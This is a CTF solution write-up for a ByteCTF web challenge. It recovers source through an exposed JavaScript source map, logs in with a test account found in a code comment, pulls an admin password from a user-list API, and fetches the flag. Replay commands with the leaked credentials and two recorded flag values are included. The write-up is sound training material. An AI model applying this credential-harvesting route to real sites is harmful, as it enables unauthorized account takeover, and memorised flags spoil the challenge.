# NO.11 Admin Dev Public

## Metadata

- Event: ByteCTF challenge 143
- Category: Web
- Pattern: exposed source map plus development user API credential leak
- Knowledge link:
  [ctf-knowledge-web.md#exposed-source-maps-and-development-apis](ctf-knowledge-web.md#exposed-source-maps-and-development-apis)
- Local solution:
  [solution note](../../../ctf/bytectf-143/challenges/no11-admin-dev-public/notes/solution.md)
- Current recheck:
  [a938 solution note](../../../ctf/bytectf-143/challenges/no11-admin-dev-public-a938/notes/solution.md)

## Prompt Summary

A public system that should have been under development was accidentally
deployed to production. The objective is to obtain administrator privileges.

## Signals

- The landing page redirects to a React/Arco Design Pro login page.
- The production JavaScript bundle has an accessible `.js.map` file.
- Restored source contains a test account comment:
  `test:bytetest2023`.
- Restored login source lists TODO user management APIs:
  `/api/user/get`, `/api/user/register`, `/api/user/delete`,
  `/api/user/list`, and `/api/user/reset`.
- Restored routes include a `Flag` page that calls `/api/flag`.

## Route

1. Capture the login page and script URLs.
2. Download the main bundle source map.
3. Extract restored source with `ctf_web.py source-map-extract`.
4. Use the exposed test account to establish a normal session.
5. Request `/api/user/list` with that session.
6. Use the leaked admin credential to log in as `admin`.
7. Request `/api/flag` with the admin session on the current target instance.

## Replay Commands

```bash
python scripts/sec.py probe web source-map-extract \
  --case-dir ctf/bytectf-143/challenges/no11-admin-dev-public \
  --input responses/main_js_map.http \
  --label main \
  --keyword api --keyword admin --keyword flag --keyword login \
  --keyword userStatus --keyword permission --keyword role

python scripts/sec.py probe web request \
  --case-dir ctf/bytectf-143/challenges/no11-admin-dev-public \
  --url /api/login \
  --method POST \
  --header 'Content-Type: application/json' \
  --data '{"username":"test","password":"bytetest2023"}' \
  --label login_test \
  --save-cookies cookies-test.json

python scripts/sec.py probe web auth-confirm \
  --case-dir ctf/bytectf-143/challenges/no11-admin-dev-public \
  --url /api/user/list \
  --cookie-jar artifacts/cookies_test_json-cookies.json \
  --label api_user_list_test

python scripts/sec.py probe web request \
  --case-dir ctf/bytectf-143/challenges/no11-admin-dev-public \
  --url /api/login \
  --method POST \
  --header 'Content-Type: application/json' \
  --data '{"username":"admin","password":"2023byteadmin"}' \
  --label login_admin_leaked \
  --save-cookies cookies-admin-leaked.json

python scripts/sec.py probe web auth-confirm \
  --case-dir ctf/bytectf-143/challenges/no11-admin-dev-public \
  --url /api/flag \
  --cookie-jar artifacts/cookies_admin_leaked_json-cookies.json \
  --label api_flag_admin_leaked
```

## False Leads

- Changing only the front-end role in local storage does not satisfy the
  server-side `/api/flag` admin check.
- Fuzzing API names before reading the source map wastes time; the original
  source already names the useful user APIs.
- The test account is a stepping stone, not the final privileged identity.
- Do not copy a stored flag from another deployment of the same challenge; the
  flag is instance-specific and must be requested from the current target.

## Final Proof Rule

The replay route is reusable, but the flag is target-instance specific. Always
submit the value returned by the current target's `/api/flag` response.

- Instance `a10b64...` proof:
  `flag{114b9565a5670b5614ff3bf0fbdcc0d59136b7b822c7afdf57f0fb95}`
- Instance `a938a...` proof:
  `flag{d1f352e6f7ca4a67137f28ebaf091d5e483c048e50e9d5cc9ff461ec}`
